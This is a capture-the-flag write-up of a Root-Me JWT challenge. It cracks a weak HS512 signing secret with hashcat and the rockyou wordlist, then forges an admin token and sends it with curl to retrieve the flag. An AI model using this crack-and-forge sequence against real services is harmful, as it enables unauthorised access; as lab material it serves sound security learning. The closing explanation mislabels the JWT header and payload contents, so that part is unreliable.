#JWT #JWT-DECODE #jwt #jwt-decoder #JWT-hashcat #jwt-hashcat

##### Challenge Description :

This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you.

Manage to recover its most valuable secrets!

https://portswigger.net/web-security/jwt

#### What is a JWT ? : 

A JWT (JSON Web Token) is a compact, URL-safe way to represent information between two parties as a JSON object. It is most commonly used for authentication because it is digitally signed, ensuring that the data inside hasn't been tampered with after being issued.

#### Understanding :

Let's open the webpage ;

![](ALL-WRITEUPS/PicoCTF/PicoCTF-assets/Pasted%20image%2020260309202928.png)

Then let's access /token

![](ALL-WRITEUPS/PicoCTF/PicoCTF-assets/Pasted%20image%2020260309202945.png)

Trying to crack it using hashcat with this special mode (we know that this is a weak secret)

```
hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw /usr/share/wordlists/rockyou.txt -w 1 --force

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw:lol

```

T


Because of the challenge Descrption, I knew that I need to change the method to post and to give the token in a HTTP header to be able to get the flag : 

![](ALL-WRITEUPS/PicoCTF/PicoCTF-assets/Pasted%20image%2020260309202958.png)

So, let's find the flag thanks to a curl

```
 curl -X POST -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg"  http://challenge01.root-me.org/web-serveur/ch59/admin
{"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"}
                                                               
┌──(h4ckrati㉿kali)-[~]
└─$ 

```


Flag : PleaseUseAStrongSecretNextTime

## Explanation of JWT : 

JWT is in JSON format and it contains 3 parts : 

>[!note]   See the image above 
Header , --> informations for example a username
Payload, --> the typ and alg
Signature --> This is very important for security
The signature = Header + Payload + Secret Key + Hash

  
>[!note] BurpSuite and JWT
Burpsuite scan identifies if there is any flaws with jwt token


>[!note] How to crack signatures ? 
>Basically hashcat tries to find the good combination to get the same result at the signature. So hashcat with every word of the wordlist do a mathematic calcul and combine them with the header and payload and tries to see if its = your signature 
>```
>hashcat -a 0 -m 16500 <jwt> <wordlist>
>```

